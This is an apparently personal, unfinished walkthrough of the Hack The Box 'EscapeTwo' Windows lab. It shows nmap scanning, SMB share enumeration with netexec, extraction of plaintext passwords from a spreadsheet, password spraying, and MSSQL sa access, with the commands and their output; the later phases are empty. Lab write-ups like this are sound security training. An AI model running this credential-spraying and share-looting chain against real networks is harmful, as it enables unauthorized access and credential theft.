---
target_ip: 10.10.11.51
platform: HTB
difficulty: Easy
os: Windows
date_started: 2025-06-15
status: in_progress
services: ['ncacn_http', 'microsoft-ds', 'kpasswd5', 'domain', 'http', 'kerberos-sec', 'msrpc', 'netbios-ssn', 'ldap', 'ms-sql-s']
techniques_used: []
tools_used: [nmap]
---

# EscapeTwo

**Platform:** HTB | **Difficulty:** Easy | **OS:** Windows | **Date:** 15/06/2025

## Overview 


---

## Phase 1: Reconnaissance 

### Network Discovery

```bash
nmap -sC -sV -T4 10.10.11.51 -oA nmap/escapetwo
```

| Port | Service      | Version                                      |
| ---- | ------------ | -------------------------------------------- |
| 53   | domain       | Simple DNS Plus                              |
| 88   | kerberos-sec | Microsoft Windows Kerberos                   |
| 135  | msrpc        | Microsoft Windows RPC                        |
| 139  | netbios-ssn  | Microsoft Windows netbios-ssn                |
| 389  | ldap         | Microsoft Windows Active Directory LDAP      |
| 445  | microsoft-ds | N/A                                          |
| 464  | kpasswd5     | N/A                                          |
| 593  | ncacn_http   | Microsoft Windows RPC over HTTP 1.0          |
| 636  | ldap         | Microsoft Windows Active Directory LDAP      |
| 1433 | ms-sql-s     | Microsoft SQL Server 2019 15.00.2000.00; RTM |
| 3268 | ldap         | Microsoft Windows Active Directory LDAP      |
| 3269 | ldap         | Microsoft Windows Active Directory LDAP      |
| 5985 | http         | Microsoft HTTPAPI httpd 2.0                  |
hosts
```bash
nxc smb '10.10.11.51' --generate-hosts-file files/hosts && sudo tee -a /etc/hosts < files/hosts

...
10.10.11.51     DC01.sequel.htb DC01
```

Save the assumed breach credentials to files
```bash
echo 'rose' > users.txt
echo 'KxEPkKe6R8su' > creds.txt
```

Use the credentials to enumerate the shares.
```bash
nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --shares 

...
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ  
```

And the users
```bash
nxc ldap 'DC01' -u 'rose' -p creds.txt -d 'sequel.htb' --users | awk '{print $5}' | grep -vE '[\[|^-]' > users.txt

Administrator
Guest
krbtgt
michael
ryan
oscar
sql_svc
rose
ca_svc
```

Spider the files on the smb server
```bash
nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' -M spider_plus -o DOWNLOAD_FLAG=True
```


```bash
cp -r /home/wither/.nxc/modules/nxc_spider_plus/10.10.11.51 .
```


Unzip the `accounts.xlsx` file to reveal a list of passwords in `xl/sharedStrings.xml`.
```bash
ls
accounting_2024.xlsx  accounts.xlsx


unzip accounts.xlsx       
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: xl/workbook.xml         
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/sharedStrings.xml    
  inflating: _rels/.rels             
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: docProps/custom.xml     
  inflating: [Content_Types].xml     
                                                                                                                                                                                             
wither@kali:~/CTF/HTB/EscapeTwo/files/10.10.11.51/Accounting Department$ grep -r "Password" > sharedstrings.txt                                                                  
xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

Add `sa` to users 
```bash
echo 'sa' >> users.txt
```

Clean up and save those passwords, adding them to the `creds.txt` list
```bash
grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '10p;15p;20p;24p' | sed -E 's/<\/?t[^>]*>//g' >> creds.txt 

cat creds.txt 

KxEPkKe6R8su
0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG
Md9Wlq1E5bZnVDVo
MSSQLP@ssw0rd!
0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG
Md9Wlq1E5bZnVDVo
MSSQLP@ssw0rd!
```

Same with the `users.txt`
```bash
grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '9p;14p;19p;23p' | sed -E 's/<\/?t[^>]*>//g' >> users.txt 

cat users.txt  

Administrator
Guest
krbtgt
michael
ryan
oscar
sql_svc
rose
ca_svc
angela
kevin
sa
```


Use the `users.txt` list and that list of passwords to spray the domain again, to find a valid login for `oscar` and password `86LxLBMgEWaKUnBG`
```bash
nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success                                                     
...
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
...
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
...
```


Add `sa` to users 
```bash
echo 'sa' >> users.txt

nxc mssql 'DC01' -u users.txt  -p creds.txt --local-auth 

...
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```




## Enumeration

---

## Phase 2: Exploitation


---

## Phase 3: Privilege Escalation



## References
- 

---
#escapetwo #htb #easy #windows